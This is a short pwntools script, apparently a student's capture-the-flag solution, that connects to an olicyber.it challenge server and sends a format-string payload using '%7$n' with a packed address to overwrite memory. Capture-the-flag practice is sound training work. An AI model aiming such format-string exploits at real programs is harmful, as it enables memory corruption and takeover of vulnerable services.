#Gregorio Maria Vallé 4^C Informatica 11/07/2023

from pwn import *

r = remote("formatted.challs.olicyber.it", 10305)

r.recvline()

r.sendline(b"....%7$n" + p64(0x40404c))

r.recv()

